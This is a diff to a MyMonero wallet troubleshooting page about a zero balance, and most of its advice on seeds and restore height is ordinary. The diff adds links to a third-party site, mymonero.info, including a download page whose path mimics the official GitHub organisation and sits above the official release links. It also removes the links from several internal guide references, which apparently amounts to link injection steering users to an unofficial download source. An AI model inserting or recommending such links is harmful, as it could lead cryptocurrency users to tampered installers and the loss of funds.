@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 A zero balance can mean the wallet has not finished scanning, the wrong wallet was opened, or the displayed history is out of date. Confirm the seed and scan settings privately, then let the wallet update before taking action.
 
+
+For a second walkthrough, see [MyMonero balance zero on mymonero.info](https://mymonero.info/mymonero-balance-zero). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [the MyMonero FAQ](https://mymonero.info/faq).
+
 ## You'll see this if
 - A wallet that previously had XMR now displays zero.
 - You restored a wallet and do not see old activity.
@@ -38,10 +41,10 @@ MyMonero desktop's final release, v1.3.3, remains available for Windows (.exe), 
 1. **Pause before sending or restoring again.** A zero display alone does not establish that funds are gone. Avoid creating a replacement wallet and sending funds until you identify the wallet and understand what its scan shows.
 2. **Confirm the wallet identity.** Check the wallet label and receiving address against your own records. Do not publish your address together with personal details, and never disclose your seed or private keys. If the address is not the one you expect, close the wallet and locate the correct recovery backup privately.
 3. **Check whether scanning is complete.** Look for a sync or scanning indicator and allow it time to update. Keep the application open and connected as appropriate. If it appears stalled, use [MyMonero not syncing guidance](./mymonero-not-syncing.md) and distinguish a server connection issue from a seed problem.
-4. **Review restore height.** If this is a restored wallet, confirm the scan start point. A height set later than the wallet's earlier activity can omit that history. When uncertain, choose an earlier height using the wallet's restore process; it is safer for finding older activity but takes longer. Read [restore height explained](./mymonero-restore-height-explained.md) before changing settings.
-5. **Check the seed format.** A 13-word seed is MyMonero-specific and legacy; a 25-word seed is standard Monero. Use the matching restore option. Inspect your own backup for order and legibility without entering it into a website or sending it to a helper. For a rejected seed see [MyMonero seed not accepted](./mymonero-seed-not-accepted.md).
+4. **Review restore height.** If this is a restored wallet, confirm the scan start point. A height set later than the wallet's earlier activity can omit that history. When uncertain, choose an earlier height using the wallet's restore process; it is safer for finding older activity but takes longer. Read restore height explained before changing settings.
+5. **Check the seed format.** A 13-word seed is MyMonero-specific and legacy; a 25-word seed is standard Monero. Use the matching restore option. Inspect your own backup for order and legibility without entering it into a website or sending it to a helper. For a rejected seed see MyMonero seed not accepted.
 6. **Allow the wallet to rescan.** Reopening, restoring, or adjusting a scan point may require time to process history. Avoid repeatedly changing settings while a scan is underway. Check the balance again after the wallet reports current status.
-7. **Look for activity, not just the headline amount.** Review incoming transaction history and status. An incoming transfer might still be pending or locked and therefore not appear as spendable. Learn the distinction in [locked and pending balance](./mymonero-locked-pending-balance.md) and transaction not showing.
+7. **Look for activity, not just the headline amount.** Review incoming transaction history and status. An incoming transfer might still be pending or locked and therefore not appear as spendable. Learn the distinction in locked and pending balance and transaction not showing.
 8. **Use a trusted support route only for non-secret details.** If you contact the project or wallet provider, describe the app version, operating system, and visible error without sending seed words, keys, or password. Nobody legitimate should ask for your seed.
 
 > [!WARNING]
@@ -92,6 +95,7 @@ No. Nobody legitimate should ask for your seed or private keys. Keep them privat
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
